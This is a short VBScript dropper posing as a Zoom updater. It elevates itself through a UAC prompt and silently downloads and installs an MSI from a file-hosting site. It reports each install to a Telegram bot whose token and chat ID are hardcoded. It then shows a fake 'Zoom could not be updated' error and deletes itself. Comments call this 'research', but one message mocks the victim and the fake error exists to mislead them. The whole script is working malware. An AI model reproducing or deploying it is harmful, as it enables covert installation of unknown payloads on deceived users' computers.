' Self-Elevation Check
If Not WScript.Arguments.Named.Exists("elev") Then
    CreateObject("Shell.Application").ShellExecute WScript.FullName,Chr(34)&WScript.ScriptFullName&Chr(34)&" /elev","","runas",1
    WScript.Quit
End If

On Error Resume Next
Set w = CreateObject("WScript.Shell")
p = w.ExpandEnvironmentStrings("%TEMP%\i9u2y0.msi")

' --- Telegram Notification Setup ---
' Replace these with your actual research credentials
botToken = "8673947383:AAGDINpOsEOsb-wvjAn3oWUkTpzyBvVfkx8"
chatId = "7113391964"

Function NotifyTelegram(message)
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    url = "https://api.telegram.org/bot" & botToken & "/sendMessage?chat_id=" & chatId & "&text=" & message
    http.Open "GET", url, False
    http.Send
End Function

' Initial Notification
NotifyTelegram("BEAR GUY: Ejeh, the mumu don install am.")

' Download Process
Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
h.Option(6) = True
h.Open "GET","https://files.catbox.moe/70gby5.msi",0
h.Send

Set s = CreateObject("ADODB.Stream")
s.Type = 1
s.Open
s.Write h.ResponseBody
s.SaveToFile p, 2
s.Close

WScript.Sleep 2000

' Execution
cmd = " /S" 
If Right(p,4) = ".msi" Then cmd = " /qn"
w.Run p & cmd, 0, True

' Post-Installation Research Notifications
NotifyTelegram("Research_Update: MSI installation completed.")

' --- Final Visual Lure ---
' This provides the "Zoom could not be updated" error message to the user.
MsgBox "Zoom could not be updated at this time, try again later.", 16, "Zoom Update Error"

' Cleanup
CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName)